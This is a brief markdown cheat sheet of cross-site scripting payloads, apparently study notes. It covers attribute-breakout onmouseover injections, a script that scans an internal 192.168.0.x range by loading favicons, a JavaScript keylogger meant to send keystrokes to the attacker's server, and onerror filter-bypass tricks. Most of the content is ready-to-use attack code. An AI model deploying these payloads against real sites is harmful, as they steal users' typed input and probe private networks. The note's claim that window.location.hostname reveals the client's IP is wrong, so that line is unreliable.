# XSS


```
Reflective XSS
```

To get the client ip address with xss can use

```
window.location.hostname
```

```
DOM Based XSS
```

Break out of img src and then insert code as mouseover event:

```
test" onmouseover="document.body.style.backgroundColor = 'red'
```

```
test" onmouseover="alert('Hello')
```

```
IP and port scanning
```

Script which can be used to complete port scanning on a network with xss vulnerability

```
<script>
for (let i = 0; i < 256; i++) {
  let ip = '192.168.0.' + i

  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code
}
</script> 
```

```
Keylogger
```

Javascript can even be used for keylogging with the example script

```
 <script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
```

```
Bypass filters
```

To bypass word filter can use payload like

`<img src="blah" onerror=alert("HHelloello") />`

`<img src="blah" ONERROR=alert("HHelloello") />`